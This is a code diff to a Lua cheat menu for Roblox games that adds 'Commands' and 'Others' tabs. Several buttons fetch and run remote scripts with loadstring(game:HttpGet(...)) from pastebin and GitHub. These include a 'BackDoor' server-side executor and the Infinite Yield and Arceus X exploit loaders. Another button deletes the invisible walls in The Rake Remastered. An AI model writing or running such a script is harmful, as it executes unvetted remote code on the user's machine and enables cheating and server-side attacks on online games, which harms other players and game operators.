@@ -14,7 +14,10 @@ local ESP = Window:NewTab("ESP")
 local PhysicalAct = PlayerState:NewSection("Physical Action")
 local AdvancedAct = PlayerState:NewSection("Advanced Action")
 local BasicSec = Basic:NewSection("Basics")
-local DeepHacks = DeepHack:NewSection("Deep Exploit")
+local DeepHacks = DeepHack:NewSection("Deep Hack")
+local Commander = Commands:NewSection("Commands")
+local Other = Others:NewSection("Others")
+local ESPs = ESP:NewSection("ESP")
 
 --EVERYTHING
 PhysicalAct:NewSlider("WalkSpeed", "ToggleSpeed", 400, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
@@ -206,13 +209,22 @@ DeepHacks:NewButton("BackDoor", "ServerSide Excutor", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua", true))()
 end)
 
+Commander:NewButton("LynX", "Open LynX", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/06iG6YkU", true))()
+end)
 
+Commander:NewButton("Arcexus", "Open 2nd Excute", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
+end)
 
+Commander:NewButton("Infinite Yield", "Open InfYield", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
 
-
-
-
-
+Other:NewButton("Delete Borders", "The Rake Remastered", function()
+    game.Workspace.Filter.InvisibleWalls:ClearAllChildren()
+game.Workspace.Filter.ServerInvisibleWalls:ClearAllChildren()
+end)
 
 
 
